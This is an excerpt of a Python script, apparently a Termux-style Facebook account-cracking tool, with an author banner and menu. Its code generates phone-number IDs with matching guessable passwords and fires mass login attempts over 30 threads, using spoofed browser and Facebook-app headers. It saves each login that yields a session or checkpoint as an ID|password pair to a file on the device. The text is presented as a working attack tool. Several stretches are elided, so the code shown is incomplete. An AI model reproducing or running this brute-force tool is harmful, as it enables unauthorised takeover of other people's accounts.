      ...
      (' \033[1;40m         #########
          (' \033[1;39m     ########
           ...
           (' \033[1;38m    ######
            ...
            (' \033[1;31m   #
----------------------------------------------------------------------
(' \033[1;31m   girl's sab bewafa hai ðŸ˜­
 Author       :(RIZWAN KHAN)
  Facebook : RIZWAN KHAN
  Version     : 0:1
----------------------------------------------------------------------"""
loop = 0
ok = []
...
def menu():
    ...
    print(' [4] SEPARATE IDZ')
    print(' [5] REMOVE DUP LINE')
...
def pak():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as lsg:
        os.system("clear")
        tl = str(len(user))
        os.system("clear")
        print(logo)
        ...
        for psx in user:
            ids = code+psx
            passlist = [psx,ids]
            lsg.submit(crack_main().m3,ids,passlist)
...
'accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','host': host,'origin': 'https://'+host,'referer': gurl,'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': "Windows",'sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
                ...
                if 'c_user' in get:
                    print(' \033[1;32m [ok] LSG ] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/LSG/ok.txt','a').write(iid+'|'+pas+'\n')
                    ok.append(iid)
                    break
                elif 'checkpoint' in get:
                    print (' \033[1;31m [oepn 7dyas ]  -LSG] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/LSG/ok.txt', 'a').write(iid+'|'+pas+'\n')
                    break
                else:continue
            loop+=1
...
'x-fb-friendly-name':	'authenticate','accept-encoding':	'gzip, deflate','x-fb-http-engine':	'Liger'}
                ...
                if 'session_key' in q:
                    ...
                    print (' \033[1;31m[open 7dyas]-LSG] '+iid+' | '+pas+'\033[0;97m')
                    open('/sdcard/LSG/ok.txt','a').write(iid+'|'+pas+'\n')
                    break
                else:continue
            loop+=1
